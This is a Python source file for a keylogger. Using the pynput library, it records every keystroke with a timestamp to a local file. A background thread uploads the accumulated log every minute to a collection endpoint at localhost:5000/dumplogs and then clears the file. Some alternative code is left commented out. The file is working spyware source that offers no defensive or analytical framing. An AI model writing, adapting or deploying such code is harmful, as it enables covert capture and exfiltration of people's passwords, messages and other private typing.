import datetime
import threading
import time
from collections import deque
import requests
import pynput


# **************[ DICT METHOD ]**************
# class KeyStruct:
#
#     def __init__(self, key, recovered=False):
#         self.key = key
#         self.pressed_at = None
#         self.released_at = None
#
#         if recovered:
#             self.released_at = datetime.datetime.now()
#         else:
#             self.pressed_at = datetime.datetime.now()
#
#     def __repr__(self):
#         return f"[{self.pressed_at} - {self.released_at}] :: {str(self.key)}"


class KeyLogger:
    # **************[ QUEUE METHOD ]**************
    key_que: deque = deque()

    # **************[ DICT METHOD ]**************
    # key_dic: dict = dict()

    def __init__(self):
        self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release, daemon=True)
        self.key_que.clear()
        self.listener.start()
        threading.Thread(target=self.sync_logs).start()

    def on_press(self, key):
        # **************[ QUEUE METHOD ]**************
        self.key_que.append(key)

        # **************[ DICT METHOD ]**************
        # self.key_dic[key]: KeyStruct = KeyStruct(key)

    def on_release(self, key):
        # **************[ QUEUE METHOD ]**************
        key_string = " + ".join(list(map(KeyLogger.get_str, self.key_que))).strip()
        if key_string:
            with open("key_logs.txt", "a+") as file:
                file.write(str(datetime.datetime.now().timestamp()) + " :: " + key_string + "\n")
            print(key_string)
        self.key_que.clear()

        # **************[ DICT METHOD ]**************
        # if key in self.key_dic:
        #     self.key_dic[key].released_at = datetime.datetime.now()
        # else:
        #     self.key_dic[key] = KeyStruct(key, recovered=True)
        #
        # print(self.key_dic[key])
        # del self.key_dic[key]

    @staticmethod
    def get_str(key):
        # if isinstance(key, pynput.keyboard.KeyCode):
        #     return str(key)[1: -1]
        return str(key)

    def sync_logs(self):
        while self.listener.is_alive():
            try:
                with open("key_logs.txt", "a+") as logs:
                    logs.seek(0)
                    data = logs.read().strip()
                    if data:
                        res = requests.post("http://localhost:5000/dumplogs", data=data)
                        if res.status_code == 200:
                            new_data = logs.read()
                            logs.truncate(0)
                            logs.write(new_data)
            except ConnectionError:
                print("COULDN'T CONNECT")
            except IOError:
                print("IO ERROR OCCURRED")

            time.sleep(60)

    def __del__(self):
        self.listener.stop()


if __name__ == "__main__":
    kl = KeyLogger()
    kl.listener.join()
